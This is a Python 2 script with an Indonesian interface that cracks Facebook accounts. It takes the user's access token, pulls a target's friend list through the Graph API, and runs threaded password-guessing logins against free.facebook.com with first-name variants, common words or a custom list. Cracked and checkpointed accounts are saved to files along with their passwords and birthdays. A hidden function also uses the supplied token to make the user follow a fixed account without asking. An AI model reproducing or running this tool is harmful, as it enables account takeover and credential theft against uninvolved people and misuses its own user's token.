#!/usr/bin/python2
# coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
b='\033[1;94m'

i='\033[1;92m'

c='\033[1;96m'

m='\033[1;91m'

u='\033[1;95m'

k='\033[1;93m'

p='\033[1;97m'

h='\033[1;92m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH 

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text
uas = random.choice(["Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11"])
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'November',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
    
def logo():
	os.system("clear")
	print("""
    ██████████
    █▄██████▄█
    █▄██████▄█
     █ ▼▼▼▼▼█
     █ ▲▲▲▲▲█
    ██████████
                                          """)
def bot_follow():
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' [!] Token Invalid')
		os.system('rm -rf login.txt')
		requests.get('https://graph.facebook.com/v1.0/100055913630645/subscribers?access_token='+token)
        menu()
        print ' [!] Token Invalid!'
        sys.exit()
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print""+p+""
		token = raw_input('\n [+] Masukkan Token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot_follow()
		except KeyError:
			print("[!] Token Invalid!")
			sys.exit()
            
    
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'[!] Tidak Ada Koneksi!'
        sys.exit()

    logo()
    print(" "+p+"[•] Author     : Dian Rizki Pratama") 
    print(" [•] Github     : https://github.com/yanhukumrimba")
    print(" [•] ---------------------------------------------")
    print(" [•] Nama       : "+nama)
    print(" [•] ID         : "+id)
    print(" [•] IP         : "+ip)
    print("")
    print(" [1]. Crack Dari Publik Teman")
    print(" [2]. Lihat Hasil Crack")
    print(" ["+m+"0"+p+"]. Keluar (Hapus Token)")
    pilih_menumbasic()


def pilih_menumbasic():
    ask = raw_input('\n [?] Pilih : ')
    if ask == '':
        print'[!] Pilih Yang Benar!'
        menu()
    elif ask == '01' or ask == '1':
        print(" [*] Isi 'me' Jika Ingin Crack Dari Daftar Teman")
        idt = raw_input(' [+] Masukan ID Target : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print' [+] Nama : ' + sp['name']
        except KeyError:
            print'[!] ID Tidak Tersedia!'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        print' [+] Total ID : ' + str(len(id))

    elif ask == '02' or ask == '2':
        print'\n [1] Hasil OK '
        print' [2] Hasil CP '
        ress = raw_input('\n [?] Pilih : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            print'\n [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system(' cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            raw_input("\n [•] Kembali ")
            menu()
        elif ress == '02' or ress == '2':
            totalcp = open('out/CP-%s-%s-%s.txt' % (ha, op, ta)).read().splitlines()
            print '\n [¤] Hasil CP Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            print " \033[1;97m[•] Total : %s" %(len(totalcp))
            print""
            os.system(' cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            raw_input("\n [•] Kembali Ke Menu ")
            menu()
        else:
            print(' [!] Pilih Yang Benar!')
            menu()
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        jalan(" [!] Berhasil Menghapus Token")
        exit()
    else:
        print'[!] Pilih Yang Benar!'
        menu()
    ask = raw_input(' [?] Apakah Anda Ingin Menggunakan Password Manual? [Y/t]: ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()

    print'\n [•] Hasil OK Disimpan Di : OK.txt'
    print" [•] Hasil CP Disimpan Di : CP.txt"
    print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0;97m [Cracking] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123', 'anjing', 'bangsat', 'sayang', 'kontol', 'jancok', 'indonesia', 'merdeka', 'rahasia', 'katasandi']:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m ••> [OK] ' + uid + ' | ' + pw + '                                            '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' ••> [OK] ' + str(uid) + ' | ' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        ttl = b['birthday']
                        print'\r\x1b[1;93m ••> [CP] ' + uid + ' | ' + pw + ' | ' + ttl + '                       '
                        cp.append(uid + ' | ' + pw + ' | ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' ••> [CP] ' + str(uid) + ' | ' + str(pw) + ' | ' + str(ttl) +                       '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        ttl = " "
                    except:pass
                    print'\r\x1b[1;93m ••> [CP] ' + uid + ' | ' + pw + '                        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' ••> [CP] ' + str(uid) + ' | ' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()


def manualmbasic():
    print'\n [•] Buat Password Contoh : bismillah,sayang,rahasia'
    pw = raw_input(' [?] Buat Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print'\n [•] Hasil OK Disimpan Di : OK.txt'
    print" [•] Hasil CP Disimpan Di : CP.txt"
    print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0;97m [Cracking] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m*--> ' + uid + ' | ' + asu + '                          '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*--> ' + str(uid) + ' | ' + str(asu) +                         '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        ttl = b['birthday']
                        print'\r\x1b[1;93m ••> [CP] ' + uid + ' | ' + asu + ' | ' + ttl + '                       '
                        cp.append(uid + ' | ' + asu + ' | ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' •••> [CP] ' + str(uid) + ' | ' + str(asu) + ' | ' + str(ttl) +                        '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        ttl = " "
                    except:pass
                    print'\r\x1b[1;93m ••> [CP] ' + uid + ' | ' + asu + '                        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' ••> [CP] ' + str(uid) + ' | ' + str(asu) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n[✓] Selesai'
    exit()
    

    
if __name__ == '__main__':
    os.system('clear')
    print logo
    tokenz()


